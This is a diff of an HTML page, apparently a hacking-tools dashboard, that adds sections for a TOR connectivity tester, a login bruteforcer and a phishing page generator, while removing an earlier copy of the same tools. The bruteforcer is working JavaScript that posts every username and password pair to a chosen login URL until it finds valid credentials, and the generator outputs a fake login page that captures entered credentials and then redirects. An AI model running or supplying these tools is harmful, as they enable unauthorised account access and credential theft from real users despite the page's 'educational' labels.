@@ -461,6 +461,219 @@
  </script>
  
 
+ ### 4. TOR Tool
+ 
+
+ *   **Purpose:** Test TOR connectivity and access .onion sites.
+ *   **Features:**
+  *   Direct TOR connection testing.
+  *   Access to .onion sites.
+  *   No TOR configuration required.
+ *   **Educational Information:** TOR (The Onion Router) is a network that provides anonymity online.
+ 
+
+ **Usage:**
+ 
+
+ <textarea id="tor-url" placeholder="TOR URL (e.g., http://example.onion)"></textarea><br>
+ <button onclick="testTorConnection()">Test TOR Connection</button>
+ <script>
+  async function testTorConnection() {
+   let url = document.getElementById('tor-url').value;
+ 
+
+   if (!url) {
+    console.error("URL cannot be empty.");
+    alert("URL cannot be empty.");
+    return;
+   }
+ 
+
+   console.log("Testing TOR connection to:", url);
+ 
+
+   try {
+    // Use a CORS proxy to handle the request through TOR
+    const corsProxyUrl = 'https://cors-anywhere.herokuapp.com/'; // Use a reliable CORS proxy
+    const response = await fetch(corsProxyUrl + url, {
+     mode: 'cors',
+    });
+ 
+
+    if (response.ok) {
+     console.log("TOR connection successful!");
+     alert("TOR connection successful!");
+    } else {
+     console.error("TOR connection failed:", response.status);
+     alert("TOR connection failed. Check console for details.");
+    }
+   } catch (error) {
+    console.error("TOR connection failed:", error);
+    alert("TOR connection failed. Check console for details.");
+   }
+  }
+ </script>
+ 
+
+ ### 5. Bruteforce Tool
+ 
+
+ *   **Purpose:** Attempt to crack logins by trying multiple username and password combinations.
+ *   **Features:**
+  *   Multiple username support.
+  *   Multiple password support.
+  *   Realtime feedback.
+ *   **Educational Information:** Bruteforcing involves trying all possible combinations until the correct one is found.
+ 
+
+ **Usage:**
+ 
+
+ <textarea id="bruteforce-url" placeholder="Target URL (e.g., http://example.com/login)"></textarea><br>
+ <textarea id="bruteforce-usernames" placeholder="List of usernames (one per line)"></textarea><br>
+ <textarea id="bruteforce-passwords" placeholder="List of passwords (one per line)"></textarea><br>
+ <button onclick="startBruteforce()">Start Bruteforce</button>
+ <div id="bruteforce-status">Status: Idle</div>
+ <script>
+  async function startBruteforce() {
+   let url = document.getElementById('bruteforce-url').value;
+   let usernames = document.getElementById('bruteforce-usernames').value.split('\n');
+   let passwords = document.getElementById('bruteforce-passwords').value.split('\n');
+   let statusDiv = document.getElementById('bruteforce-status');
+ 
+
+   if (!url || usernames.length === 0 || passwords.length === 0) {
+    console.error("URL, usernames, and passwords cannot be empty.");
+    alert("URL, usernames, and passwords cannot be empty.");
+    return;
+   }
+ 
+
+   console.log("Starting bruteforce attack on:", url);
+   statusDiv.innerText = "Status: Running...";
+ 
+
+   for (let username of usernames) {
+    for (let password of passwords) {
+     console.log("Trying:", username, password);
+     statusDiv.innerText = `Status: Trying ${username} : ${password}`;
+ 
+
+     try {
+      const formData = new FormData();
+      formData.append('username', username);
+      formData.append('password', password);
+ 
+
+      const response = await fetch(url, {
+       method: 'POST',
+       body: formData,
+       mode: 'cors'
+      });
+ 
+
+      if (response.ok) {
+       const responseText = await response.text();
+ 
+
+       if (responseText.includes('Login successful') || responseText.includes('Welcome')) {
+        console.log("Success! Credentials found:", username, password);
+        statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
+        alert(`Success! Credentials found: ${username} : ${password}`);
+        return;
+       } else {
+        console.log("Failed:", response.status);
+       }
+      } else {
+       console.log("Failed:", response.status);
+      }
+     } catch (error) {
+      console.error("Bruteforce failed:", error);
+     }
+    }
+   }
+ 
+
+   statusDiv.innerText = "Status: Bruteforce failed. No credentials found.";
+   alert("Bruteforce failed. No credentials found.");
+  }
+ </script>
+ 
+
+ ### 6. Phishing Tool
+ 
+
+ *   **Purpose:** Generate phishing pages for educational purposes.
+ *   **Features:**
+  *   Customizable target URL.
+  *   Customizable redirect URL.
+  *   Generates simple HTML form.
+ *   **Educational Information:** Phishing is a deceptive way to obtain sensitive information such as usernames and passwords.
+ 
+
+ **Usage:**
+ 
+
+ <textarea id="phishing-url" placeholder="Target URL (e.g., http://example.com)"></textarea><br>
+ <textarea id="phishing-redirect" placeholder="Redirect URL after login (e.g., http://google.com)"></textarea><br>
+ <button onclick="generatePhishingPage()">Generate Phishing Page</button>
+ <div id="phishing-code"></div>
+ <script>
+  function generatePhishingPage() {
+   let targetUrl = document.getElementById('phishing-url').value;
+   let redirectUrl = document.getElementById('phishing-redirect').value;
+   let phishingCodeDiv = document.getElementById('phishing-code');
+ 
+
+   if (!targetUrl || !redirectUrl) {
+    console.error("Target URL and Redirect URL cannot be empty.");
+    alert("Target URL and Redirect URL cannot be empty.");
+    return;
+   }
+ 
+
+   console.log("Generating phishing page for:", targetUrl);
+ 
+
+   let phishingPage = `
+  <!DOCTYPE html>
+  <html>
+  <head>
+  <title>Login</title>
+  </head>
+  <body>
+  <h1>Login to ${targetUrl}</h1>
+  <form action="${targetUrl}" method="post">
+  <label for="username">Username:</label><br>
+  <input type="text" id="username" name="username"><br>
+  <label for="password">Password:</label><br>
+  <input type="password" id="password" name="password"><br><br>
+  <input type="submit" value="Login">
+  </form>
+  <script>
+  window.onload = function() {
+  var form = document.querySelector('form');
+  form.addEventListener('submit', function(event) {
+  event.preventDefault();
+  var username = document.getElementById('username').value;
+  var password = document.getElementById('password').value;
+  
+  console.log('Username:', username, 'Password:', password);
+  
+  window.location.href = '${redirectUrl}';
+  });
+  };
+  </script>
+  </body>
+  </html>
+  `;
+ 
+
+   phishingCodeDiv.innerText = phishingPage;
+  }
+ </script>
+ 
+
  ### Reporting
  
 
@@ -658,179 +871,4 @@
   particlesJS.load('particles-js', 'particlesjs-config.json', function() {
    console.log('particles.js loaded - scanlines enabled');
   });
- </script>
- 
-
- <!-- TOR Tool Section -->
- <h3>TOR Tool</h3>
- <textarea id="tor-url" placeholder="TOR URL (e.g., http://example.onion)"></textarea><br>
- <button onclick="testTorConnection()">Test TOR Connection</button>
- <script>
-  async function testTorConnection() {
-   let url = document.getElementById('tor-url').value;
- 
-
-   if (!url) {
-    console.error("URL cannot be empty.");
-    alert("URL cannot be empty.");
-    return;
-   }
- 
-
-   console.log("Testing TOR connection to:", url);
- 
-
-   try {
-    const response = await fetch(url, {
-     mode: 'cors',
-    });
- 
-
-    if (response.ok) {
-     console.log("TOR connection successful!");
-     alert("TOR connection successful!");
-    } else {
-     console.error("TOR connection failed:", response.status);
-     alert("TOR connection failed. Check console for details.");
-    }
-   } catch (error) {
-    console.error("TOR connection failed:", error);
-    alert("TOR connection failed. Check console for details.");
-   }
-  }
- </script>
- 
-
- <!-- Bruteforce Tool Section -->
- <h3>Bruteforce Tool</h3>
- <textarea id="bruteforce-url" placeholder="Target URL (e.g., http://example.com/login)"></textarea><br>
- <textarea id="bruteforce-usernames" placeholder="List of usernames (one per line)"></textarea><br>
- <textarea id="bruteforce-passwords" placeholder="List of passwords (one per line)"></textarea><br>
- <button onclick="startBruteforce()">Start Bruteforce</button>
- <div id="bruteforce-status">Status: Idle</div>
- <script>
-  async function startBruteforce() {
-   let url = document.getElementById('bruteforce-url').value;
-   let usernames = document.getElementById('bruteforce-usernames').value.split('\n');
-   let passwords = document.getElementById('bruteforce-passwords').value.split('\n');
-   let statusDiv = document.getElementById('bruteforce-status');
- 
-
-   if (!url || usernames.length === 0 || passwords.length === 0) {
-    console.error("URL, usernames, and passwords cannot be empty.");
-    alert("URL, usernames, and passwords cannot be empty.");
-    return;
-   }
- 
-
-   console.log("Starting bruteforce attack on:", url);
-   statusDiv.innerText = "Status: Running...";
- 
-
-   for (let username of usernames) {
-    for (let password of passwords) {
-     console.log("Trying:", username, password);
-     statusDiv.innerText = `Status: Trying ${username} : ${password}`;
- 
-
-     try {
-      const formData = new FormData();
-      formData.append('username', username);
-      formData.append('password', password);
- 
-
-      const response = await fetch(url, {
-       method: 'POST',
-       body: formData,
-       mode: 'cors'
-      });
- 
-
-      if (response.ok) {
-       const responseText = await response.text();
- 
-
-       if (responseText.includes('Login successful') || responseText.includes('Welcome')) {
-        console.log("Success! Credentials found:", username, password);
-        statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
-        alert(`Success! Credentials found: ${username} : ${password}`);
-        return;
-       } else {
-        console.log("Failed:", response.status);
-       }
-      } else {
-       console.log("Failed:", response.status);
-      }
-     } catch (error) {
-      console.error("Bruteforce failed:", error);
-     }
-    }
-   }
- 
-
-   statusDiv.innerText = "Status: Bruteforce failed. No credentials found.";
-   alert("Bruteforce failed. No credentials found.");
-  }
- </script>
- 
-
- <!-- Phishing Tool Section -->
- <h3>Phishing Tool</h3>
- <textarea id="phishing-url" placeholder="Target URL (e.g., http://example.com)"></textarea><br>
- <textarea id="phishing-redirect" placeholder="Redirect URL after login (e.g., http://google.com)"></textarea><br>
- <button onclick="generatePhishingPage()">Generate Phishing Page</button>
- <div id="phishing-code"></div>
- <script>
-  function generatePhishingPage() {
-   let targetUrl = document.getElementById('phishing-url').value;
-   let redirectUrl = document.getElementById('phishing-redirect').value;
-   let phishingCodeDiv = document.getElementById('phishing-code');
- 
-
-   if (!targetUrl || !redirectUrl) {
-    console.error("Target URL and Redirect URL cannot be empty.");
-    alert("Target URL and Redirect URL cannot be empty.");
-    return;
-   }
- 
-
-   console.log("Generating phishing page for:", targetUrl);
- 
-
-   let phishingPage = `
-  <!DOCTYPE html>
-  <html>
-  <head>
-  <title>Login</title>
-  </head>
-  <body>
-  <h1>Login to ${targetUrl}</h1>
-  <form action="${targetUrl}" method="post">
-  <label for="username">Username:</label><br>
-  <input type="text" id="username" name="username"><br>
-  <label for="password">Password:</label><br>
-  <input type="password" id="password" name="password"><br><br>
-  <input type="submit" value="Login">
-  </form>
-  <script>
-  window.onload = function() {
-  var form = document.querySelector('form');
-  form.addEventListener('submit', function(event) {
-  event.preventDefault();
-  var username = document.getElementById('username').value;
-  var password = document.getElementById('password').value;
-  
-  console.log('Username:', username, 'Password:', password);
-  
-  window.location.href = '${redirectUrl}';
-  });
-  };
-  </script>
-  </body>
-  </html>
-  `;
- 
-
-   phishingCodeDiv.innerText = phishingPage;
-  }
  </script>
